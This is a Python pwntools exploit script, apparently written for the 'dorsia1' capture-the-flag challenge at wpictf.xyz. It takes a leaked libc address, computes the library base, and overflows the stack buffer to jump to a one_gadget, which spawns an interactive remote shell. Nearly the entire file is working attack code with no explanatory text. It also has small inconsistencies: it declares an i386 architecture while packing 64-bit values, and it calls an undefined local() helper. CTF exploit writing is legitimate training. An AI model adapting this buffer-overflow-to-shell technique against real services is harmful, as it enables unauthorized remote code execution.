#!/usr/bin/env python
from pwn import *

context.update(arch = 'i386')
exe = '.'
libc = ELF('libc.so.6')

host = 'dorsia1.wpictf.xyz'
port = 31337

def remote(argv = [], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
       gdb.attach(io, gdbscript = gdbscript)
    return io

def start(argv = [], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
       return local(argv, *a, **kw)
    else:
       return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
one_gadget = 0x10a38c
io = start()

leak = eval(io.recv())
print(leak)

libc.address =  leak - (libc.symbols.system + 765772)
payload = libc.address + one_gadget

io.sendline(cyclic(69 + 8) + p64(payload))

io.interactive()
